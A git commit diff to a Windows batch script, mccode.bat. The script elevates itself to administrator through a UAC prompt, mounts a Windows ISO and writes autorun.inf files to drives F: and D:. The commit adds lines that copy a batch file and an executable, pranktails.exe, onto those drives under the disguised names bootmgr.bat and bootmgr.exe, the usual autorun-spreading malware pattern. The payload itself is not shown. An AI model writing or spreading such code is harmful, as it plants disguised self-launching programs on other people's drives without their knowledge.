329f6d5265d033a4d64fe5592d75443aae238fcb
Demir <130374789+Siradankullanici@users.noreply.github.com>
2023-04-12 14:09:08 +0300

    Add files via upload

--- mccode.bat
+++ mccode.bat
@@ -3,6 +3,10 @@ if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 cd F:
 start F:\Win10_22H2_Turkish_x64.iso
 del D:\autorun.inf
+copy system.inf "F:\autorun.inf"
+copy mapoto.bat "F:\bootmgr.bat"
+copy pranktails.exe "F:\bootmgr.exe"
 copy system.inf "D:\autorun.inf"
 copy mapoto.bat "D:\bootmgr.bat"
+copy pranktails.exe "D:\bootmgr.exe"
 pause
